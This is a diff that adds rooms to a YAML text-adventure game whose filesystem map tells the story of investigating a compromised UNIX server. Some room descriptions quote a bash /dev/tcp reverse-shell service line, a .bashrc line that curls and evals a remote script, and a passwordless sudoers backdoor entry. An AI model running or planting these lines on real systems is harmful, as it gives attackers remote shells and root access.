@@ -2,150 +2,878 @@ title: "The UNIX Catacombs"
 starting_room: login_terminal
 death: respawn
 
+# =============================================================================
+# ROOMS — Phase 1: ~100 rooms across localhost core filesystem
+# =============================================================================
+
 rooms:
+
+  # ===========================================================================
+  # / (root) — the entry point
+  # ===========================================================================
+
   login_terminal:
     name: "Login Prompt"
     description_seed: "A green phosphor terminal flickers in the darkness. The cursor blinks steadily. UNIX System V — Catacomb Edition. You are a process, newly spawned, standing before the system's login gate. A crumpled man page lies on the floor. The filesystem stretches south."
     connections:
-      south:
-        room: home_dir
-        type: open
+      south: {room: root_fs, type: open}
     items: [man_page]
 
-  home_dir:
-    name: "/home/guest"
-    description_seed: "A sparse home directory. A .bashrc file glows faintly on the floor. Three paths branch out: a well-worn path west to /tmp, a narrow corridor east to /var/log, and a passage south with /etc/shadow stenciled above it."
+  root_fs:
+    name: "/ (root)"
+    description_seed: "The root of the filesystem. All paths begin and end here. Corridors branch in every direction — the skeleton of a UNIX system laid bare. The air smells of silicon and old documentation. Something is wrong. Faint traces of unauthorized access mar the walls."
     connections:
-      north:
-        room: login_terminal
-        type: open
-      west:
-        room: tmp_wasteland
-        type: open
-      east:
-        room: var_log
-        type: open
-      south:
-        room: etc_shadow
-        type: open
-    items: [alias_shield]
+      north: {room: login_terminal, type: open}
+      south: {room: home, type: open}
+      east: {room: var, type: open}
+      west: {room: usr, type: open}
+      up: {room: proc, type: open}
+      down: {room: dev, type: open}
 
-  tmp_wasteland:
-    name: "/tmp Wasteland"
-    description_seed: "A chaotic landscape of abandoned temp files. Half-finished downloads, orphaned sockets, and stale lock files litter the ground. A Segfault Daemon shambles between the debris, corrupting everything it touches. A pipe juts from the ground nearby."
-    connections:
-      east:
-        room: home_dir
-        type: open
-      south:
-        room: pipe_maze
-        type: open
-    enemies: [segfault_daemon]
-    items: [pipe_connector]
+  # ===========================================================================
+  # /boot — system startup
+  # ===========================================================================
 
-  var_log:
-    name: "/var/log"
-    description_seed: "Walls of scrolling text surround you — system logs, auth logs, error messages cascading forever. Most are noise, but patterns emerge if you look carefully. A grep tool hangs on the wall in a glass case labeled 'Break in case of emergency.' One line stands out: WARN — OOM Killer activated."
+  boot:
+    name: "/boot"
+    description_seed: "The cold chamber where the system begins. A massive GRUB menu etched in stone dominates the north wall — boot entries, kernel versions, fallback options. Most entries are dusty. One has been recently modified."
     connections:
-      west:
-        room: home_dir
-        type: open
-    items: [grep_tool, kill_nine]
+      south: {room: root_fs, type: open}
+      east: {room: boot_grub, type: open}
+      west: {room: boot_kernel, type: open}
 
-  pipe_maze:
-    name: "The Pipe Maze"
-    description_seed: "You are inside a network of UNIX pipes connecting processes. Data streams flow in every direction. Pipes branch in all directions — some loop back on themselves, one leads to the void of /dev/null. A faint light glows from the south where an open gate leads onward."
+  boot_grub:
+    name: "/boot/grub"
+    description_seed: "GRUB configuration files line the walls like ancient scrolls. grub.cfg, its entries readable if you squint. Someone added a boot entry that drops to a root shell without authentication. A classic persistence trick."
     connections:
-      north:
-        room: tmp_wasteland
-        type: open
-      south:
-        room: root_chamber
-        type: open
-      west:
-        room: dev_null
-        type: open
+      west: {room: boot, type: open}
+    items: [grub_config]
 
-  dev_null:
-    name: "/dev/null"
-    description_seed: "Void. Absolute nothing. Data enters and is destroyed. You feel yourself dissolving at the edges. A faint echo of a path leads east, back to the pipe junction."
+  boot_kernel:
+    name: "/boot/vmlinuz"
+    description_seed: "The kernel image rests here — a compressed monolith of compiled logic. An initrd image sits beside it. Both are signed. The signatures check out. At least the kernel hasn't been tampered with. Yet."
     connections:
-      east:
-        room: pipe_maze
-        type: open
-    enemies: [null_byte]
+      east: {room: boot, type: open}
 
-  root_chamber:
-    name: "The Root Chamber"
-    description_seed: "A vast chamber carved from pure silicon. On a pedestal of stacked man pages rests the Root Shell — a glowing terminal prompt pulsing with # instead of $. The air hums with privilege escalation. The OOM Killer stands guard — a towering process reaper with kill -9 crackling in its hands."
-    connections:
-      north:
-        room: pipe_maze
-        type: open
-      south:
-        room: root_shell
-        type: open
-    enemies: [oom_killer]
+  # ===========================================================================
+  # /etc — system configuration (15 rooms)
+  # ===========================================================================
 
-  root_shell:
-    name: "The Root Shell"
-    description_seed: "The OOM Killer is gone. The Root Shell glows before you — root@catacombs:~# — Welcome, superuser. You now have root access. The system is yours. chmod 777 everything."
+  etc:
+    name: "/etc"
+    description_seed: "The library of the system. Configuration files in every alcove — passwd, fstab, hosts, resolv.conf. The beating heart of system identity. Some files have been recently modified. Timestamps don't match the change log."
     connections:
-      north:
-        room: root_chamber
-        type: open
-    items: [root_shell]
+      north: {room: root_fs, type: open}
+      south: {room: etc_ssh, type: open}
+      east: {room: etc_cron_d, type: open}
+      west: {room: etc_pam_d, type: open}
+      up: {room: etc_shadow, type: open}
+      down: {room: etc_systemd, type: open}
 
   etc_shadow:
     name: "/etc/shadow"
-    description_seed: "The secrets of the system lie bare before you. Password hashes line the walls like ancient runes. This vault was worth the trouble."
+    description_seed: "The vault of secrets. Password hashes line the walls like ancient runes — SHA-512, bcrypt, the occasional horrifying MD5. One entry catches your eye: a new user 'backdoor' with a known weak hash. Someone has been here."
     connections:
-      north:
-        room: home_dir
-        type: open
+      down: {room: etc, type: open}
     items: [shadow_file]
 
+  etc_passwd:
+    name: "/etc/passwd"
+    description_seed: "User accounts etched in stone. root:x:0:0, daemon:x:1:1, the usual suspects. But at the bottom — a user named 'backdoor' with UID 0. A root-equivalent account, hiding in plain sight."
+    connections:
+      south: {room: etc, type: open}
+
+  etc_ssh:
+    name: "/etc/ssh"
+    description_seed: "The SSH server configuration chamber. sshd_config hangs on the wall, its settings exposed. PermitRootLogin is set to 'yes'. PasswordAuthentication is 'yes'. The authorized_keys file has been modified — there's a key here that doesn't belong."
+    connections:
+      north: {room: etc, type: open}
+      east: {room: etc_ssh_keys, type: open}
+
+  etc_ssh_keys:
+    name: "/etc/ssh/authorized_keys"
+    description_seed: "A ring of SSH public keys. Most are legitimate — admin, dev, backup. One key has a comment: 'persistence@c2.darknet.onion'. The attacker's key, granting permanent access. It should be removed."
+    connections:
+      west: {room: etc_ssh, type: open}
+    items: [rogue_ssh_key]
+
+  etc_cron_d:
+    name: "/etc/cron.d"
+    description_seed: "Scheduled tasks tick like clockwork. Logrotate, certbot renewal, backup scripts — all normal. But one crontab entry runs every 5 minutes: a curl command that phones home to an external server. A Cron Backdoor process guards it jealously."
+    connections:
+      west: {room: etc, type: open}
+      south: {room: etc_cron_daily, type: open}
+    enemies: [cron_backdoor]
+
+  etc_cron_daily:
+    name: "/etc/cron.daily"
+    description_seed: "Daily maintenance scripts. Logrotate, man-db, apt. One script has been modified — it downloads and executes a payload from a remote URL before running the legitimate task. Subtle. Effective."
+    connections:
+      north: {room: etc_cron_d, type: open}
+
+  etc_pam_d:
+    name: "/etc/pam.d"
+    description_seed: "The authentication gauntlet. PAM modules stacked like checkpoints — pam_unix, pam_deny, pam_permit. The chain is intact, mostly. But pam_rootok has been added to su — any user can su to root without a password."
+    connections:
+      east: {room: etc, type: open}
+      south: {room: etc_sudoers, type: open}
+    items: [sudo_token]
+
+  etc_sudoers:
+    name: "/etc/sudoers"
+    description_seed: "The sudoers file, etched in immutable stone. Well, supposedly immutable. Someone added 'backdoor ALL=(ALL) NOPASSWD: ALL'. Full sudo access, no password required. visudo weeps."
+    connections:
+      north: {room: etc_pam_d, type: open}
+
+  etc_systemd:
+    name: "/etc/systemd/system"
+    description_seed: "Systemd unit files arranged in orderly rows. Services, timers, sockets. Most are standard — sshd.service, nginx.service, cron.service. One service file stands out: 'update-helper.service'. It starts a reverse shell on boot."
+    connections:
+      up: {room: etc, type: open}
+      east: {room: etc_systemd_services, type: open}
+
+  etc_systemd_services:
+    name: "/etc/systemd/system (services)"
+    description_seed: "More service units. The 'update-helper.service' file is here in full — ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1'. A textbook reverse shell. Enabled and running."
+    connections:
+      west: {room: etc_systemd, type: open}
+
+  etc_nginx:
+    name: "/etc/nginx"
+    description_seed: "The web server configuration. nginx.conf, sites-available, sites-enabled. The main config looks clean, but sites-enabled has a suspicious server block listening on port 8443 — proxying to an internal service that shouldn't be exposed."
+    connections:
+      south: {room: etc, type: open}
+      east: {room: etc_nginx_sites, type: open}
+
+  etc_nginx_sites:
+    name: "/etc/nginx/sites-enabled"
+    description_seed: "Symlinks to site configurations. The default site serves static files. The suspicious site on 8443 proxies to localhost:9999 — an unauthenticated admin panel for the legacy application in /opt."
+    connections:
+      west: {room: etc_nginx, type: open}
+
+  etc_iptables:
+    name: "/etc/iptables"
+    description_seed: "The firewall ruleset. Or what's left of it. INPUT chain: ACCEPT all. FORWARD chain: ACCEPT all. OUTPUT chain: ACCEPT all. Every rule has been flushed. The system is wide open. An Iptables Shield lies broken on the floor."
+    connections:
+      north: {room: etc, type: open}
+    items: [iptables_shield]
+
+  # ===========================================================================
+  # /home — user directories (12 rooms)
+  # ===========================================================================
+
+  home:
+    name: "/home"
+    description_seed: "User home directories branch from this corridor. Four doors: guest (open), admin (locked with a sturdy padlock), dev (ajar), and a hidden door barely visible in the shadows."
+    connections:
+      north: {room: root_fs, type: open}
+      south: {room: home_guest, type: open}
+      east: {room: home_admin, type: locked}
+      west: {room: home_dev, type: open}
+
+  home_guest:
+    name: "/home/guest"
+    description_seed: "A sparse home directory. Your home. A .bashrc file glows faintly. Directories branch to .ssh and Desktop. An Alias Shield hangs on the wall — sourced from .bashrc, it deflects the worst of incoming signals."
+    connections:
+      north: {room: home, type: open}
+      east: {room: home_guest_ssh, type: open}
+      south: {room: home_guest_desktop, type: open}
+      west: {room: home_guest_bashrc, type: open}
+    items: [alias_shield]
+
+  home_guest_ssh:
+    name: "/home/guest/.ssh"
+    description_seed: "Your SSH directory. A keypair — id_rsa and id_rsa.pub. The key is only authorized on this machine. known_hosts lists several servers you've connected to before. The fingerprints match... mostly."
+    connections:
+      west: {room: home_guest, type: open}
+
+  home_guest_bashrc:
+    name: "/home/guest/.bashrc"
+    description_seed: "Your shell configuration. Aliases, PATH settings, a PS1 prompt with colors. Everything looks normal. But at the bottom — a line you didn't add: 'eval $(curl -s http://10.0.0.99/init.sh)'. It runs every time you open a shell."
+    connections:
+      east: {room: home_guest, type: open}
+
+  home_guest_desktop:
+    name: "/home/guest/Desktop"
+    description_seed: "A cluttered desktop. README files, old scripts, a half-finished report. One file stands out — 'URGENT_security_notice.txt'. It warns about suspicious activity detected by the monitoring system three days ago. Nobody responded."
+    connections:
+      north: {room: home_guest, type: open}
+    items: [security_notice]
+
+  home_admin:
+    name: "/home/admin"
+    description_seed: "The administrator's home directory. Neat, organized. Scripts in ~/scripts, documentation in ~/docs. The .ssh directory to the east holds keys to other systems. A firewall config draft sits on the desk."
+    connections:
+      west: {room: home, type: open}
+      east: {room: home_admin_ssh, type: open}
+      south: {room: home_admin_scripts, type: open}
+
+  home_admin_ssh:
+    name: "/home/admin/.ssh"
+    description_seed: "The admin's SSH keys. Several keypairs, each labeled: webserver, database, monitoring. The webserver key is what you need to investigate the compromised web server."
+    connections:
+      west: {room: home_admin, type: open}
+    items: [admin_ssh_key]
+
+  home_admin_scripts:
+    name: "/home/admin/scripts"
+    description_seed: "Admin maintenance scripts. backup.sh, deploy.sh, incident-response.sh. The incident response script is thorough — it collects logs, checksums binaries, and checks for known indicators of compromise. Useful reading."
+    connections:
+      north: {room: home_admin, type: open}
+    items: [ir_script]
+
+  home_dev:
+    name: "/home/dev"
+    description_seed: "The developer's workspace. Source code repositories, build scripts, Docker configs. The dev was working on the legacy app in /opt. Their .ssh directory holds a key to the build server."
+    connections:
+      east: {room: home, type: open}
+      south: {room: home_dev_ssh, type: open}
+      west: {room: home_dev_src, type: open}
+
+  home_dev_ssh:
+    name: "/home/dev/.ssh"
+    description_seed: "The developer's SSH keys. One keypair labeled 'buildserver'. The private key is unencrypted — no passphrase. Convenient for CI/CD. Convenient for attackers too."
+    connections:
+      north: {room: home_dev, type: open}
+    items: [dev_ssh_key]
+
+  home_dev_src:
+    name: "/home/dev/src"
+    description_seed: "Source code for the legacy application. Java, Spring Boot, Maven. The pom.xml has a dependency on a library that was compromised six months ago. The dev never updated it."
+    connections:
+      east: {room: home_dev, type: open}
+
+  home_attacker:
+    name: "/home/.hidden"
+    description_seed: "A hidden directory. Not visible in a normal ls — only with ls -la. Inside: a toolkit. Nmap output, credential dumps, pivot scripts. The attacker staged their entire operation from here. A timestamp shows they first accessed the system 72 hours ago."
+    connections:
+      north: {room: home, type: hidden}
+    enemies: [rogue_ssh_agent]
+    items: [attacker_notes]
+
+  # ===========================================================================
+  # /tmp — temporary storage (9 rooms)
+  # ===========================================================================
+
+  tmp:
+    name: "/tmp"
+    description_seed: "The temporary filesystem. A chaotic landscape of abandoned files, orphaned sockets, and stale lock files. The world-writable permissions make this a favorite staging ground for attackers. Paths lead in several directions."
+    connections:
+      north: {room: root_fs, type: open}
+      south: {room: tmp_wasteland, type: open}
+      east: {room: tmp_sockets, type: open}
+      west: {room: tmp_hidden, type: hidden}
+
+  tmp_wasteland:
+    name: "/tmp (wasteland)"
+    description_seed: "The deepest part of /tmp. Half-finished downloads, core dumps, compiler temporaries. A Segfault Daemon shambles between the debris, corrupting everything it touches. A pipe connector juts from the ground."
+    connections:
+      north: {room: tmp, type: open}
+      south: {room: tmp_pipes, type: open}
+      east: {room: tmp_locks, type: open}
+    enemies: [segfault_daemon]
+    items: [pipe_connector]
+
+  tmp_locks:
+    name: "/tmp (lock files)"
+    description_seed: "A graveyard of stale lock files. .lock, .pid, .lck — processes long dead but their locks remain, blocking anything that tries to use the same resource. A Stale Lock entity clings to a particularly stubborn .pid file."
+    connections:
+      west: {room: tmp_wasteland, type: open}
+    enemies: [stale_lock]
+
+  tmp_pipes:
+    name: "/tmp (pipe junction)"
+    description_seed: "A nexus of UNIX pipes. Named pipes, anonymous pipes, FIFOs — data streams flow in every direction. Some pipes loop back on themselves. One leads south to /dev. The pipe maze is disorienting but navigable."
+    connections:
+      north: {room: tmp_wasteland, type: open}
+      south: {room: dev, type: open}
+      east: {room: tmp_pipe_maze_1, type: open}
+
+  tmp_pipe_maze_1:
+    name: "Pipe Maze (east branch)"
+    description_seed: "Inside a network of UNIX pipes. Data flows past you in both directions. This branch connects to another junction. The walls are slick with buffered output."
+    connections:
+      west: {room: tmp_pipes, type: open}
+      south: {room: tmp_pipe_maze_2, type: open}
+
+  tmp_pipe_maze_2:
+    name: "Pipe Maze (south branch)"
+    description_seed: "The pipe narrows. You can hear data being consumed ahead — a process reading from the pipe. The pipe exits to the east."
+    connections:
+      north: {room: tmp_pipe_maze_1, type: open}
+      east: {room: tmp_pipe_exit, type: open}
+
+  tmp_pipe_exit:
+    name: "Pipe Maze (exit)"
+    description_seed: "The pipe widens into a chamber. A core dump sits in the corner — still warm. The process that created it crashed recently. A path leads back north to /tmp."
+    connections:
+      west: {room: tmp_pipe_maze_2, type: open}
+      north: {room: tmp, type: open}
+    items: [core_dump]
+
+  tmp_sockets:
+    name: "/tmp (sockets)"
+    description_seed: "UNIX domain sockets cluster here like fungi. mysql.sock, docker.sock, X11 sockets. The docker.sock is world-readable — anyone can issue Docker commands. That's a privilege escalation waiting to happen."
+    connections:
+      west: {room: tmp, type: open}
+
+  tmp_hidden:
+    name: "/tmp/.hidden"
+    description_seed: "A hidden directory in /tmp. The attacker's staging area. Encrypted communications logs, compiled exploits, a Metasploit payload. A Fork Bomb lurks here — a script that spawns copies of itself endlessly."
+    connections:
+      east: {room: tmp, type: hidden}
+    enemies: [fork_bomb]
+    items: [exploit_payload]
+
+  # ===========================================================================
+  # /var — variable data (14 rooms)
+  # ===========================================================================
+
+  var:
+    name: "/var"
+    description_seed: "Variable data — the system's memory of what has happened. Logs to the south, spools to the east, the web root to the west. The air is thick with the smell of ink and old paper — log entries printed endlessly."
+    connections:
+      west: {room: root_fs, type: open}
+      south: {room: var_log, type: open}
+      east: {room: var_spool, type: open}
+      north: {room: var_run, type: open}
+      down: {room: var_lib, type: open}
+
+  var_log:
+    name: "/var/log"
+    description_seed: "Walls of scrolling text — syslog, auth.log, kern.log, daemon.log. Most are noise, but patterns emerge if you look carefully. A Grep Tool hangs on the wall in a glass case labeled 'Break in case of emergency.'"
+    connections:
+      north: {room: var, type: open}
+      south: {room: var_log_auth, type: open}
+      east: {room: var_log_syslog, type: open}
+      west: {room: var_log_kern, type: open}
+    items: [grep_tool]
+
+  var_log_auth:
+    name: "/var/log/auth.log"
+    description_seed: "Authentication logs. Failed login attempts scroll past — hundreds of them. Brute force attacks from multiple IPs. Then: 'Accepted publickey for backdoor from 10.0.0.99'. The attacker got in three days ago. A Log Rotator enemy patrols here, trying to destroy the evidence."
+    connections:
+      north: {room: var_log, type: open}
+    enemies: [log_rotator]
+
+  var_log_syslog:
+    name: "/var/log/syslog"
+    description_seed: "The system log. Kernel messages, service starts and stops, cron jobs firing. Deep in the log: 'update-helper.service: Main process exited, code=exited, status=0/SUCCESS' — the reverse shell service, starting every boot."
+    connections:
+      west: {room: var_log, type: open}
+
+  var_log_kern:
+    name: "/var/log/kern.log"
+    description_seed: "Kernel messages. Hardware detection, module loading, the occasional oops. One entry stands out: a kernel module was loaded from /tmp — 'rootkit.ko'. The rootkit is already in the kernel."
+    connections:
+      east: {room: var_log, type: open}
+
+  var_log_nginx:
+    name: "/var/log/nginx"
+    description_seed: "Nginx access and error logs. Thousands of requests. Most are normal web traffic. But the access log shows POST requests to /admin/upload.php — a web shell being accessed repeatedly from the same IP."
+    connections:
+      north: {room: var_log, type: open}
+
+  var_spool:
+    name: "/var/spool"
+    description_seed: "The spool directory. Mail queues, print queues, cron output. Undelivered mail piles up — bounce messages, cron output nobody reads. The mail queue has outbound messages to addresses that look like C2 domains."
+    connections:
+      west: {room: var, type: open}
+      south: {room: var_spool_mail, type: open}
+
+  var_spool_mail:
+    name: "/var/spool/mail"
+    description_seed: "Mailboxes for system users. Root's mailbox is overflowing with cron output and logwatch reports. One message is from the monitoring system: 'CRITICAL: Outbound connection to known C2 IP detected.' Sent three days ago. Unread."
+    connections:
+      north: {room: var_spool, type: open}
+
+  var_run:
+    name: "/var/run"
+    description_seed: "PID files and runtime data. sshd.pid, nginx.pid, cron.pid — all the running services. One PID file doesn't match any known service: 'update-helper.pid'. The reverse shell is running."
+    connections:
+      south: {room: var, type: open}
+
+  var_lib:
+    name: "/var/lib"
+    description_seed: "Persistent state for services. dpkg status, apt lists, MySQL databases. The dpkg database shows packages were installed recently — netcat, socat, nmap. Tools an attacker would need. A Core Dump sits in the corner."
+    connections:
+      up: {room: var, type: open}
+      east: {room: var_lib_mysql, type: open}
+    items: [core_dump_2]
+
+  var_lib_mysql:
+    name: "/var/lib/mysql"
+    description_seed: "MySQL data directory. Database files, binary logs, the ibdata tablespace. The binary log shows queries: 'SELECT * FROM users WHERE 1=1' — the entire users table was dumped. Data exfiltration."
+    connections:
+      west: {room: var_lib, type: open}
+
+  var_www:
+    name: "/var/www/html"
+    description_seed: "The web root. Static HTML files, a WordPress installation, and... upload.php. A web shell. Simple PHP: accepts POST data and passes it to system(). The attacker has been executing commands through the web server."
+    connections:
+      north: {room: var, type: open}
+    items: [web_shell_evidence]
+
+  # ===========================================================================
+  # /usr — user programs (14 rooms)
+  # ===========================================================================
+
+  usr:
+    name: "/usr"
+    description_seed: "User programs and libraries. The arsenal of the system — every tool, every binary, every shared library. Some of these tools have been tampered with. Trust nothing."
+    connections:
+      east: {room: root_fs, type: open}
+      south: {room: usr_bin, type: open}
+      west: {room: usr_sbin, type: open}
+      down: {room: usr_lib, type: open}
+      north: {room: usr_local, type: open}
+
+  usr_bin:
+    name: "/usr/bin"
+    description_seed: "Standard user binaries. ls, cat, grep, find, awk — the everyday tools. But checksums don't match for three binaries: ls, ps, and netstat. They've been replaced with trojaned versions that hide the attacker's files and processes."
+    connections:
+      north: {room: usr, type: open}
+      east: {room: usr_bin_ls, type: open}
+      south: {room: usr_bin_ps, type: open}
+      west: {room: usr_bin_netstat, type: open}
+
+  usr_bin_ls:
+    name: "/usr/bin/ls (trojaned)"
+    description_seed: "The ls binary. It looks normal, but it's been modified. This version filters out any file matching patterns: '.hidden', 'update-helper', 'rootkit'. The real ls is backed up at /usr/bin/.ls.bak. A Trojan Binary guards it."
+    connections:
+      west: {room: usr_bin, type: open}
+    enemies: [trojan_binary]
+    items: [real_ls]
+
+  usr_bin_ps:
+    name: "/usr/bin/ps (trojaned)"
+    description_seed: "The ps binary. Modified to hide processes owned by the 'backdoor' user. Running the real ps from /usr/bin/.ps.bak reveals three hidden processes: a reverse shell, a cryptocurrency miner, and a port scanner."
+    connections:
+      north: {room: usr_bin, type: open}
+
+  usr_bin_netstat:
+    name: "/usr/bin/netstat (trojaned)"
+    description_seed: "The netstat binary. This version hides connections to 10.0.0.99 (the C2 server). The real netstat shows an established connection on port 4444 — the reverse shell phoning home."
+    connections:
+      east: {room: usr_bin, type: open}
+
+  usr_sbin:
+    name: "/usr/sbin"
+    description_seed: "System administration binaries. sshd, nginx, cron, iptables, useradd. The heavy artillery of system management. A Chroot Jail sits in the corner — portable isolation."
+    connections:
+      east: {room: usr, type: open}
+      south: {room: usr_sbin_tools, type: open}
+    items: [chroot_jail]
+
+  usr_sbin_tools:
+    name: "/usr/sbin (tools)"
+    description_seed: "More system tools. tcpdump for packet capture, strace for system call tracing, lsof for open files. The strace blade glows faintly — a weapon that exposes process internals."
+    connections:
+      north: {room: usr_sbin, type: open}
+    items: [strace_blade]
+
+  usr_lib:
+    name: "/usr/lib"
+    description_seed: "Shared libraries. libc, libssl, libpthread — the foundations everything is built on. Something is wrong. libpam_unix.so has been modified — the authentication library. A Rootkit hides among the legitimate libraries, invisible until you know where to look."
+    connections:
+      up: {room: usr, type: open}
+      east: {room: usr_lib_modules, type: open}
+    enemies: [rootkit]
+
+  usr_lib_modules:
+    name: "/usr/lib/modules"
+    description_seed: "Kernel modules. Network drivers, filesystem drivers, crypto modules. A module named 'rootkit.ko' is loaded — it hooks system calls to hide files and processes at the kernel level. The Grep Tool can reveal its hooks."
+    connections:
+      west: {room: usr_lib, type: open}
+
+  usr_local:
+    name: "/usr/local"
+    description_seed: "Locally installed software. Not managed by the package manager — manually compiled and installed. A GDB Debugger sits here, powerful but heavy. Several custom scripts in /usr/local/bin."
+    connections:
+      south: {room: usr, type: open}
+      east: {room: usr_local_bin, type: open}
+    items: [gdb_debugger]
+
+  usr_local_bin:
+    name: "/usr/local/bin"
+    description_seed: "Custom binaries. Monitoring scripts, deployment tools, helper utilities. One binary stands out — 'update-helper'. The reverse shell payload. It was installed here to survive package updates."
+    connections:
+      west: {room: usr_local, type: open}
+
+  # ===========================================================================
+  # /dev — device files (8 rooms)
+  # ===========================================================================
+
+  dev:
+    name: "/dev"
+    description_seed: "Device files. The interface between software and hardware. Special files that represent everything from disks to terminals to the void itself. The air hums with I/O."
+    connections:
+      up: {room: root_fs, type: open}
+      south: {room: dev_null, type: open}
+      east: {room: dev_pts, type: open}
+      west: {room: dev_random, type: open}
+      north: {room: tmp_pipes, type: open}
+      down: {room: dev_sda, type: open}
+
+  dev_null:
+    name: "/dev/null"
+    description_seed: "The void. Absolute nothing. Data enters and is destroyed — no trace, no recovery, no mercy. The Null Byte lives here, an entity of pure negation. It absorbs everything and returns nothing. The ultimate garbage collector."
+    connections:
+      north: {room: dev, type: open}
+    enemies: [null_byte]
+
+  dev_zero:
+    name: "/dev/zero"
+    description_seed: "An infinite stream of zeros. Peaceful. Meditative. The opposite of /dev/null — instead of destroying, it creates. An endless supply of nothing, paradoxically restorative. Rest here and your processes stabilize. An Entropy Potion bubbles from a spring."
+    connections:
+      east: {room: dev, type: open}
+    items: [entropy_potion]
+
+  dev_random:
+    name: "/dev/random"
+    description_seed: "The entropy pool. Randomness harvested from hardware interrupts, mouse movements, keyboard timing. The pool is shallow — entropy is precious. An Entropy Potion has crystallized from the accumulated randomness."
+    connections:
+      east: {room: dev, type: open}
+      south: {room: dev_zero, type: open}
+    items: [entropy_potion_2]
+
+  dev_pts:
+    name: "/dev/pts"
+    description_seed: "Pseudo-terminal devices. Each one represents an active terminal session — SSH connections, tmux panes, screen windows. Four terminals are active. Three are legitimate. One belongs to the attacker. A Rogue SSH Agent lurks among the terminals."
+    connections:
+      west: {room: dev, type: open}
+      south: {room: dev_pts_3, type: open}
+    enemies: [rogue_ssh_agent_2]
+
+  dev_pts_3:
+    name: "/dev/pts/3 (rogue session)"
+    description_seed: "The attacker's terminal session. Commands scroll past: whoami, id, cat /etc/shadow, scp... They've been active. The session is still open. The connection traces back to 10.0.0.99."
+    connections:
+      north: {room: dev_pts, type: open}
+
+  dev_sda:
+    name: "/dev/sda"
+    description_seed: "The primary disk device. Raw block access to the system's storage. Partitions branch from here — sda1 (boot), sda2 (root), sda3 (swap). Reading raw blocks can reveal deleted files the attacker tried to hide."
+    connections:
+      up: {room: dev, type: open}
+      east: {room: dev_sda2, type: open}
+
+  dev_sda2:
+    name: "/dev/sda2 (root partition)"
+    description_seed: "The root partition's raw blocks. Beneath the filesystem abstraction, data is just bytes on a platter. Deleted files leave ghosts here — fragments of the attacker's tools that rm couldn't fully erase."
+    connections:
+      west: {room: dev_sda, type: open}
+
+  # ===========================================================================
+  # /proc — process information (9 rooms)
+  # ===========================================================================
+
+  proc:
+    name: "/proc"
+    description_seed: "The process filesystem. Not a real filesystem — a window into the running kernel. Every process has a directory here. Every kernel parameter is tunable. The system's vital signs are readable from these walls."
+    connections:
+      down: {room: root_fs, type: open}
+      south: {room: proc_1, type: open}
+      east: {room: proc_self, type: open}
+      west: {room: proc_net, type: open}
+      north: {room: proc_sys, type: open}
+
+  proc_1:
+    name: "/proc/1 (init)"
+    description_seed: "PID 1 — systemd, the mother of all processes. The first process spawned at boot, the last to die at shutdown. Its cgroup tree shows every running service. The process tree reveals the hierarchy of the system."
+    connections:
+      north: {room: proc, type: open}
+      east: {room: proc_1_status, type: open}
+
+  proc_1_status:
+    name: "/proc/1/status"
+    description_seed: "The status of PID 1. Running as root. Memory usage nominal. Threads: 1. The process is healthy. But its child processes include some suspicious entries — PIDs that don't correspond to any known service."
+    connections:
+      west: {room: proc_1, type: open}
+
+  proc_self:
+    name: "/proc/self"
+    description_seed: "Your own process. PID, memory maps, file descriptors, environment variables. You can see yourself reflected in the proc filesystem. Your environment contains the PATH, HOME, and — oddly — a variable called C2_CALLBACK_URL. That's not yours."
+    connections:
+      west: {room: proc, type: open}
+
+  proc_net:
+    name: "/proc/net"
+    description_seed: "Network statistics. TCP connections, UDP listeners, routing tables. The tcp file shows established connections — and there it is: a connection to 10.0.0.99:4444 owned by the 'backdoor' user. The reverse shell, in plain sight."
+    connections:
+      east: {room: proc, type: open}
+      south: {room: proc_net_route, type: open}
+
+  proc_net_route:
+    name: "/proc/net/route"
+    description_seed: "The routing table. Default gateway, local subnets, and — a route that shouldn't be there. Traffic to 10.0.0.0/24 is being routed through a tunnel interface. The attacker set up a VPN tunnel for persistent access."
+    connections:
+      north: {room: proc_net, type: open}
+
+  proc_sys:
+    name: "/proc/sys"
+    description_seed: "Kernel tunable parameters. ip_forward, tcp_syncookies, randomize_va_space. Some of these have been changed — ip_forward is enabled (this machine is routing traffic), ASLR is disabled. The OOM Killer patrols this area, ready to reap any process that uses too much memory."
+    connections:
+      south: {room: proc, type: open}
+      east: {room: proc_sys_kernel, type: open}
+    enemies: [oom_killer]
+
+  proc_sys_kernel:
+    name: "/proc/sys/kernel"
+    description_seed: "Deep kernel parameters. hostname, panic, modules_disabled. The Kernel Panic boss guards this chamber — a catastrophic failure entity that can freeze the entire system. Defeating it stabilizes the kernel and lets you disable module loading."
+    connections:
+      west: {room: proc_sys, type: open}
+    enemies: [kernel_panic]
+
+  proc_rogue:
+    name: "/proc/[rogue PIDs]"
+    description_seed: "Process directories for PIDs that don't belong to any legitimate service. A cryptocurrency miner, a port scanner, and the reverse shell — all running under the 'backdoor' user. Zombie Processes shamble between the directories."
+    connections:
+      south: {room: proc, type: open}
+    enemies: [zombie_process, zombie_process_2]
+
+  # ===========================================================================
+  # /opt — third-party software (6 rooms)
+  # ===========================================================================
+
+  opt:
+    name: "/opt"
+    description_seed: "Third-party software. Not part of the base system — installed separately, maintained separately, often forgotten. A legacy Java application lives here, running on an ancient version of Tomcat."
+    connections:
+      east: {room: root_fs, type: open}
+      south: {room: opt_legacy, type: open}
+      west: {room: opt_monitoring, type: open}
+
+  opt_legacy:
+    name: "/opt/legacy-app"
+    description_seed: "The legacy application. Java 8, Spring Boot 1.x, Tomcat 7. Known CVEs: 47. Patches applied: 0. The application has an unauthenticated admin panel exposed through nginx on port 8443. This was the initial entry point."
+    connections:
+      north: {room: opt, type: open}
+      east: {room: opt_legacy_logs, type: open}
+      south: {room: opt_legacy_webinf, type: open}
+
+  opt_legacy_logs:
+    name: "/opt/legacy-app/logs"
+    description_seed: "Application logs. Stack traces, SQL queries, HTTP requests. The logs show the attacker exploited a deserialization vulnerability — a crafted Java object that executes arbitrary code when deserialized."
+    connections:
+      west: {room: opt_legacy, type: open}
+
+  opt_legacy_webinf:
+    name: "/opt/legacy-app/WEB-INF"
+    description_seed: "The web application's internal configuration. web.xml, application.properties, compiled classes. The application.properties file contains database credentials in plaintext. The same credentials work for the MySQL database."
+    connections:
+      north: {room: opt_legacy, type: open}
+    items: [db_credentials]
+
+  opt_monitoring:
+    name: "/opt/monitoring"
+    description_seed: "The monitoring stack. Prometheus, Grafana, Alertmanager. All running, all collecting data, all alerting. The alerts have been firing for 72 hours. 'High CPU usage', 'Unusual outbound traffic', 'New user account created'. All unread. All ignored."
+    connections:
+      east: {room: opt, type: open}
+
+  # ===========================================================================
